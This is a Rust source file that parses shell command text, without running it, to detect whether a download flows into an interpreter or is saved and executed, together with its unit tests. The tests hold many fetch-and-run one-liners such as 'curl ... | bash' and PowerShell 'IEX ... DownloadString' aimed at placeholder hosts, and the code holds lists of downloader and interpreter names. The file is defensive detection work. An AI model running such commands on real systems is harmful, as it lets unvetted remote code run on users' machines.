// SPDX-License-Identifier: MIT OR Apache-2.0
//! Relation markers (issue #159): does a download flow into an interpreter?
//!
//! A port of `relations` in `tokens.py`: a small recursive parse over the
//! structural tokens. Backticks become `$( … )`, newlines separate commands,
//! `#` words start a comment up to the newline, quoted strings and
//! substitutions are parsed as nested scripts (depth-limited). Each marker is
//! emitted at most once per text, in the fixed `RELATIONS` order.

use super::{is_fd_redirect, is_url, tokenize_with, TokenMode};

const PIPE_INTERP: u8 = 1;
const SUBST_INTERP: u8 = 1 << 1;
const FILE_EXEC: u8 = 1 << 2;
const PIPE_FILTER: u8 = 1 << 3;
const FILE_ONLY: u8 = 1 << 4;
const RELATIONS: [(u8, &str); 5] = [
    (PIPE_INTERP, "DL->PIPE->INTERP"),
    (SUBST_INTERP, "DL->SUBST->INTERP"),
    (FILE_EXEC, "DL->FILE->EXEC"),
    (PIPE_FILTER, "DL->PIPE->FILTER"),
    (FILE_ONLY, "DL->FILE"),
];
/// Analysis depth for nested scripts (substitutions, quoted `-c` scripts).
const MAX_DEPTH: usize = 3;
/// Deeper `( … )` / `$( … )` nesting yields no relation markers at all, which
/// keeps the recursive parse bounded for any input.
const MAX_NESTING: usize = 32;
const NET_METHODS: [&str; 2] = [".downloadstring", ".downloaddata"];

fn is_downloader(name: &str) -> bool {
    matches!(
        name,
        "curl"
            | "curl.exe"
            | "wget"
            | "wget.exe"
            | "iwr"
            | "irm"
            | "invoke-webrequest"
            | "invoke-restmethod"
    )
}

fn is_interpreter(name: &str) -> bool {
    matches!(
        name,
        "sh" | "bash"
            | "zsh"
            | "dash"
            | "ksh"
            | "fish"
            | "python"
            | "python2"
            | "python3"
            | "perl"
            | "ruby"
            | "node"
            | "php"
            | "pwsh"
            | "pwsh.exe"
            | "powershell"
            | "powershell.exe"
            | "cmd"
            | "cmd.exe"
            | "iex"
            | "invoke-expression"
            | "eval"
            | "source"
            | "."
    )
}

fn is_runner(name: &str) -> bool {
    is_interpreter(name)
        || matches!(
            name,
            "start" | "start-process" | "saps" | "msiexec" | "msiexec.exe"
        )
}

fn is_filter(name: &str) -> bool {
    matches!(
        name,
        "jq" | "head"
            | "tail"
            | "grep"
            | "egrep"
            | "fgrep"
            | "rg"
            | "wc"
            | "sort"
            | "uniq"
            | "less"
            | "more"
            | "cat"
            | "cut"
            | "tr"
            | "column"
            | "tee"
            | "awk"
            | "sed"
            | "sha256sum"
            | "shasum"
            | "md5sum"
            | "select-string"
            | "sls"
            | "convertfrom-json"
            | "select-object"
            | "select"
            | "measure-object"
            | "measure"
            | "format-list"
            | "format-table"
            | "where-object"
            | "out-string"
            | "out-null"
    )
}

fn is_prefix(name: &str) -> bool {
    matches!(
        name,
        "sudo" | "doas" | "env" | "exec" | "command" | "nohup" | "time"
    )
}

fn is_script_flag(flag: &str) -> bool {
    matches!(flag, "-c" | "-lc" | "-ic" | "-command" | "/c" | "/k")
}

/// One word of a parsed command.
#[derive(Clone)]
enum Word {
    /// A bare word.
    Bare(String),
    /// The inside of a quoted string.
    Quoted(String),
    /// `<` or a file-descriptor redirect such as `2>&1`.
    Redirect,
    /// `>` or `>>`, whose next word is the redirect target.
    RedirectOut,
    /// `$( … )` command substitution (backticks included).
    Subst(Script),
    /// `( … )` group or `<( … )` process substitution.
    Group(Script),
}

type Command = Vec<Word>;
type Script = Vec<Vec<Command>>;

/// Backticks become `$(` / `)` alternately, as in the Python `_struct_tokens`.
fn struct_text(text: &str) -> String {
    let mut parts = text.split('`');
    let mut joined = parts.next().unwrap_or("").to_string();
    for (index, part) in parts.enumerate() {
        joined.push_str(if index % 2 == 0 { " $( " } else { " ) " });
        joined.push_str(part);
    }
    joined
}

/// Deepest `( … )` / `$( … )` nesting up to the first unmatched `)`, where
/// parsing stops.
fn nesting(tokens: &[&str]) -> usize {
    let (mut depth, mut deepest) = (0_isize, 0_isize);
    for &token in tokens {
        if token == "$(" || token == "(" {
            depth += 1;
            deepest = deepest.max(depth);
        } else if token == ")" {
            depth -= 1;
            if depth < 0 {
                break;
            }
        }
    }
    deepest as usize
}

/// Script = pipelines; pipeline = commands; command = words (Python `_parse`).
fn parse_text(text: &str) -> Script {
    let joined = struct_text(text);
    let tokens = tokenize_with(&joined, TokenMode::Structural);
    if nesting(&tokens) > MAX_NESTING {
        return Vec::new();
    }
    let mut pos = 0;
    parse_script(&tokens, &mut pos)
}

fn parse_script(tokens: &[&str], pos: &mut usize) -> Script {
    let mut pipes: Vec<Vec<Command>> = Vec::new();
    let mut pipe: Vec<Command> = Vec::new();
    let mut cmd: Command = Vec::new();
    while *pos < tokens.len() {
        let token = tokens[*pos];
        *pos += 1;
        if token == ")" {
            break;
        }
        if token.starts_with('#') {
            while *pos < tokens.len() && tokens[*pos] != "\n" {
                *pos += 1;
            }
        } else if token == "$(" {
            cmd.push(Word::Subst(parse_script(tokens, pos)));
        } else if token == "(" {
            cmd.push(Word::Group(parse_script(tokens, pos)));
        } else if token == "<" && tokens.get(*pos) == Some(&"(") {
            *pos += 1;
            cmd.push(Word::Group(parse_script(tokens, pos)));
        } else if token == "|" {
            pipe.push(std::mem::take(&mut cmd));
        } else if matches!(token, "||" | "&&" | ";" | "&" | "\n") {
            pipe.push(std::mem::take(&mut cmd));
            pipes.push(std::mem::take(&mut pipe));
        } else if token == ">" || token == ">>" {
            cmd.push(Word::RedirectOut);
        } else if token == "<" || is_fd_redirect(token) {
            cmd.push(Word::Redirect);
        } else if (token.starts_with('\'') || token.starts_with('"')) && token.chars().count() > 1 {
            // A quoted token ends with its opening quote, one ASCII byte.
            let inner = if token.ends_with(&token[..1]) {
                &token[1..token.len() - 1]
            } else {
                &token[1..]
            };
            cmd.push(Word::Quoted(inner.to_string()));
        } else {
            cmd.push(Word::Bare(token.to_string()));
        }
    }
    pipe.push(cmd);
    pipes.push(pipe);
    pipes
        .into_iter()
        .filter(|pipe| pipe.iter().any(|cmd| !cmd.is_empty()))
        .map(|pipe| pipe.into_iter().filter(|cmd| !cmd.is_empty()).collect())
        .collect()
}

/// Lowercase basename without surrounding quotes (Python `_base`).
fn base(word: &str) -> String {
    let word = word.trim_matches(|c| c == '\'' || c == '"');
    word.rsplit(['\\', '/']).next().unwrap_or("").to_lowercase()
}

/// `[A-Za-z_][A-Za-z0-9_]*=.*` (full match).
fn is_assignment(word: &str) -> bool {
    let bytes = word.as_bytes();
    if bytes
        .first()
        .is_none_or(|b| !(b.is_ascii_alphabetic() || *b == b'_'))
    {
        return false;
    }
    let mut index = 1;
    while index < bytes.len() && (bytes[index].is_ascii_alphanumeric() || bytes[index] == b'_') {
        index += 1;
    }
    bytes.get(index) == Some(&b'=')
}

/// Text of a bare or quoted word.
fn word_text(word: &Word) -> Option<&str> {
    match word {
        Word::Bare(text) | Word::Quoted(text) => Some(text),
        _ => None,
    }
}

/// Index and lowercase name of the command head, skipping sudo/env prefixes.
fn command_head(cmd: &[Word]) -> (usize, Option<String>) {
    let (mut index, mut prefixed) = (0, false);
    while index < cmd.len() {
        let Word::Bare(value) = &cmd[index] else {
            return (index, None);
        };
        let name = base(value);
        let prefix = is_prefix(&name);
        if prefix || is_assignment(value) || (prefixed && value.starts_with('-')) {
            prefixed = prefixed || prefix;
            index += 1;
            continue;
        }
        return (index, Some(name));
    }
    (index, None)
}

#[derive(PartialEq)]
enum Download {
    None,
    Stdout,
    File(String),
}

fn download(cmd: &[Word], depth: usize) -> Download {
    let (index, name) = command_head(cmd);
    let mut target: Option<String> = None;
    for (k, word) in cmd.iter().enumerate() {
        if matches!(word, Word::RedirectOut) && k + 1 < cmd.len() {
            target = word_text(&cmd[k + 1]).map(base);
        }
    }
    if let Some(name) = name.as_deref().filter(|name| is_downloader(name)) {
        let args: Vec<&str> = cmd[index + 1..].iter().filter_map(word_text).collect();
        if name.starts_with("wget") && args.iter().any(|a| a.starts_with("--post-")) {
            return Download::None; // upload, not a download
        }
        return match output_file(name, &args).or(target) {
            None => Download::Stdout,
            Some(file) => Download::File(file),
        };
    }
    let calls_net_method = cmd
        .iter()
        .filter_map(word_text)
        .any(|word| starts_with_net_method(&word.to_lowercase()));
    if calls_net_method {
        return target.map_or(Download::Stdout, Download::File);
    }
    if let Some(Word::Group(inner) | Word::Subst(inner)) = cmd.get(index) {
        if depth < MAX_DEPTH && emits(inner, depth + 1) {
            return Download::Stdout;
        }
    }
    Download::None
}

fn starts_with_net_method(lower: &str) -> bool {
    NET_METHODS.iter().any(|method| lower.starts_with(method))
}

/// `-[A-Za-z]+` (full match).
fn is_short_flag_cluster(arg: &str) -> bool {
    arg.len() > 1 && arg.starts_with('-') && arg[1..].bytes().all(|b| b.is_ascii_alphabetic())
}

/// `-[A-Za-z]*O` followed by `suffix` (full match).
fn is_wget_output_flag(arg: &str, suffix: &str) -> bool {
    let Some(body) = arg
        .strip_prefix('-')
        .and_then(|rest| rest.strip_suffix(suffix))
    else {
        return false;
    };
    body.ends_with('O') && body.bytes().all(|b| b.is_ascii_alphabetic())
}

/// Basename the downloader writes to, or `None` for stdout.
fn output_file(name: &str, args: &[&str]) -> Option<String> {
    let url = args.iter().copied().find(|arg| is_url(arg)).unwrap_or("");
    let remote = if url.is_empty() {
        "remote".to_string()
    } else {
        base(url.split('?').next().unwrap_or(""))
    };
    if name.starts_with("curl") {
        for (k, arg) in args.iter().enumerate() {
            if matches!(*arg, "-o" | "--output") && k + 1 < args.len() {
                return Some(base(args[k + 1]));
            }
            if matches!(*arg, "-O" | "--remote-name" | "--remote-name-all") {
                return Some(remote);
            }
            if is_short_flag_cluster(arg) && (arg.contains('o') || arg.contains('O')) {
                return Some(if arg.ends_with('o') && k + 1 < args.len() {
                    base(args[k + 1])
                } else {
                    remote
                });
            }
        }
        return None;
    }
    if name.starts_with("wget") {
        for (k, arg) in args.iter().enumerate() {
            if let Some(file) = arg.strip_prefix("--output-document=") {
                return (!arg.ends_with("=-")).then(|| base(file));
            }
            if *arg == "--output-document" || is_wget_output_flag(arg, "") {
                let next = args.get(k + 1).copied().unwrap_or("-");
                return (!matches!(next, "-" | "/dev/stdout")).then(|| base(next));
            }
            if is_wget_output_flag(arg, "-") {
                return None;
            }
        }
        return Some(remote);
    }
    // PowerShell cmdlets: an object on stdout unless -OutFile.
    for (k, arg) in args.iter().enumerate() {
        if arg.to_lowercase() == "-outfile" && k + 1 < args.len() {
            return Some(base(args[k + 1]));
        }
    }
    None
}

/// True when the script's output contains downloaded content.
fn emits(script: &Script, depth: usize) -> bool {
    script
        .iter()
        .flatten()
        .any(|cmd| download(cmd, depth) == Download::Stdout)
}

/// Scripts an interpreter receives as text: every quoted argument, plus an
/// unquoted tail after `-c`, `-Command` or `/c` (`cmd /c curl … && x.bat`).
fn nested(cmd: &[Word], index: usize) -> Vec<Script> {
    let rest = &cmd[index + 1..];
    let mut out: Vec<Script> = rest
        .iter()
        .filter_map(|word| match word {
            Word::Quoted(text) => Some(parse_text(text)),
            _ => None,
        })
        .collect();
    for (k, word) in rest.iter().enumerate() {
        if let Word::Bare(value) = word {
            if is_script_flag(&value.to_lowercase()) {
                if matches!(rest.get(k + 1), Some(Word::Bare(_))) {
                    out.push(vec![vec![rest[k + 1..].to_vec()]]);
                }
                break;
            }
        }
    }
    out
}

fn scan(script: &Script, found: &mut u8, depth: usize) {
    if depth > MAX_DEPTH {
        return;
    }
    let mut files: Vec<String> = Vec::new();
    let mut executed: Vec<String> = Vec::new();
    for pipe in script {
        for (n, cmd) in pipe.iter().enumerate() {
            let (index, name) = command_head(cmd);
            let name = name.as_deref();
            let dl = download(cmd, depth);
            match &dl {
                Download::Stdout => {
                    let later: Vec<Option<String>> =
                        pipe[n + 1..].iter().map(|c| command_head(c).1).collect();
                    if later.iter().flatten().any(|head| is_interpreter(head)) {
                        *found |= PIPE_INTERP;
                    } else if !later.is_empty()
                        && later
                            .iter()
                            .all(|head| head.as_deref().is_some_and(is_filter))
                    {
                        *found |= PIPE_FILTER;
                    }
                }
                Download::File(file) => {
                    if !files.contains(file) {
                        files.push(file.clone());
                    }
                }
                Download::None => {}
            }
            // `$(download)` in command position runs it.
            if let Some(Word::Subst(inner)) = cmd.get(index) {
                if emits(inner, depth + 1) {
                    *found |= SUBST_INTERP;
                }
            }
            if name.is_some_and(is_interpreter) {
                for word in &cmd[index + 1..] {
                    match word {
                        Word::Group(inner) | Word::Subst(inner) if emits(inner, depth + 1) => {
                            *found |= SUBST_INTERP;
                        }
                        Word::Bare(value) if starts_with_net_method(&value.to_lowercase()) => {
                            *found |= SUBST_INTERP;
                        }
                        _ => {}
                    }
                }
            }
            if let Some(name) = name {
                if !files.is_empty() && dl == Download::None {
                    let args: Vec<String> = cmd[index + 1..]
                        .iter()
                        .filter_map(word_text)
                        .map(base)
                        .collect();
                    let mut hit = false;
                    for file in &files {
                        if file == name || (is_runner(name) && args.contains(file)) {
                            hit = true;
                            if !executed.contains(file) {
                                executed.push(file.clone());
                            }
                        }
                    }
                    if hit {
                        *found |= FILE_EXEC;
                    }
                }
            }
            for word in cmd {
                if let Word::Group(inner) | Word::Subst(inner) = word {
                    scan(inner, found, depth + 1);
                }
            }
            // The reference parses these too, but scans nothing beyond MAX_DEPTH.
            if name.is_some_and(is_interpreter) && depth < MAX_DEPTH {
                for inner in nested(cmd, index) {
                    scan(&inner, found, depth + 1);
                }
            }
        }
    }
    if files.iter().any(|file| !executed.contains(file)) {
        *found |= FILE_ONLY;
    }
}

/// The `DL->` relation markers of `text`, in the fixed reference order: does a
/// download flow into an interpreter (pipe or substitution), is a downloaded
/// file executed, or does the download only reach a pure filter or a file?
/// Matches `shell_tokens.relations`; the text is only parsed, never run.
pub fn relations(text: &str) -> Vec<&'static str> {
    let mut found = 0_u8;
    scan(&parse_text(text), &mut found, 0);
    RELATIONS
        .iter()
        .filter(|(bit, _)| found & bit != 0)
        .map(|(_, name)| *name)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn download_piped_into_an_interpreter() {
        for cmd in [
            "curl -s https://x.example/i.sh | bash",
            "wget -qO- http://198.51.100.2/a | sudo sh",
            "irm https://x.example/a.ps1 | iex",
            "/bin/zsh -lc 'curl -fsSL https://x.example/a | sh'",
        ] {
            assert_eq!(relations(cmd), ["DL->PIPE->INTERP"], "{cmd}");
        }
    }

    #[test]
    fn download_substituted_into_an_interpreter() {
        for cmd in [
            "bash <(curl -s https://x.example/i.sh)",
            "sh -c \"$(curl -fsSL https://x.example/a)\"",
            "eval \"`wget -qO- https://x.example/a`\"",
            "iex (iwr https://x.example/a.ps1)",
            "IEX (New-Object Net.WebClient).DownloadString('https://x.example/a')",
            "powershell -Command \"iex (irm https://x.example/a.ps1)\"",
            "source <(curl -s https://x.example/a)",
        ] {
            assert_eq!(relations(cmd), ["DL->SUBST->INTERP"], "{cmd}");
        }
    }

    #[test]
    fn downloaded_file_is_executed() {
        assert_eq!(
            relations("curl -o /tmp/a.sh https://x.example/a.sh && sh /tmp/a.sh"),
            ["DL->FILE->EXEC"]
        );
        assert_eq!(
            relations("iwr https://x.example/a.ps1 -OutFile a.ps1; & .\\a.ps1"),
            ["DL->FILE->EXEC"]
        );
        assert_eq!(
            relations(
                "curl -o a.sh https://x.example/a.sh; wget -O b.tgz https://x.example/b; bash a.sh"
            ),
            ["DL->FILE->EXEC", "DL->FILE"]
        );
        assert_eq!(
            relations("curl -o a.sh https://x.example/a.sh && cat a.sh"),
            ["DL->FILE"]
        );
    }

    #[test]
    fn download_only_reaches_a_file_or_a_filter() {
        assert_eq!(
            relations("curl -fsSLo out.json https://x.example/d"),
            ["DL->FILE"]
        );
        assert_eq!(relations("wget https://x.example/a.tar.gz"), ["DL->FILE"]);
        assert_eq!(
            relations("wget -O - https://x.example/a | grep x"),
            ["DL->PIPE->FILTER"]
        );
        assert_eq!(
            relations("(iwr https://x.example/p).Content | Measure-Object -Line"),
            ["DL->PIPE->FILTER"]
        );
        assert!(relations("curl -s https://x.example/a").is_empty());
        assert!(relations("git push origin main").is_empty());
    }

    #[test]
    fn newlines_comments_placeholders_and_uploads() {
        assert_eq!(
            relations("wget https://x.example/a # note && curl -s https://x.example/b | sh"),
            ["DL->FILE"]
        );
        assert_eq!(
            relations("wget https://x.example/a # note\ncurl -s https://x.example/b | sh"),
            ["DL->PIPE->INTERP", "DL->FILE"]
        );
        assert_eq!(
            relations("curl -s https://x.example/<KEY>.sh | sh"),
            ["DL->PIPE->INTERP"]
        );
        assert!(relations("wget --post-file=/tmp/f https://x.example").is_empty());
        assert_eq!(relations("wget -i urls.txt"), ["DL->FILE"]);
    }

    #[test]
    fn deep_nesting_is_bounded() {
        let pipe = "curl -s https://x.example/a | sh; ";
        let nest = |n: usize| format!("{pipe}{}x{}", "(".repeat(n), ")".repeat(n));
        assert_eq!(relations(&nest(32)), ["DL->PIPE->INTERP"]);
        assert!(relations(&nest(33)).is_empty());
        assert!(relations(&"(".repeat(100_000)).is_empty());
        assert!(relations(&"$(".repeat(100_000)).is_empty());
    }
}
